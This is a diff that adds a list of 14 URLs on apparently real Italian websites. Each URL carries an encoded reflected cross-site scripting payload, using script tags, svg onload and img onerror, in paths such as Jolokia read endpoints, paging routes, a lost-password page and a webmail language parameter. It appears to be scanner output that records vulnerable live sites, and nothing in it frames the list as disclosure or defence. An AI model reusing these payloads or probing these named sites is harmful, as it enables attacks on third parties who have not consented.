@@ -1,0 +1,14 @@
+http://arwio.it/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://attivazioni.ntmobile.it/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://bellacapri.it/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://bellezzasalutebenessere.it/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://benesserearioli.it/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://biofordrug.it/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://biogance.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://bioio.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://bitpit.it/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://blasius.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://blconsultant.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://casagency.it/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://casalife.it/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://blog.erpy.it/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
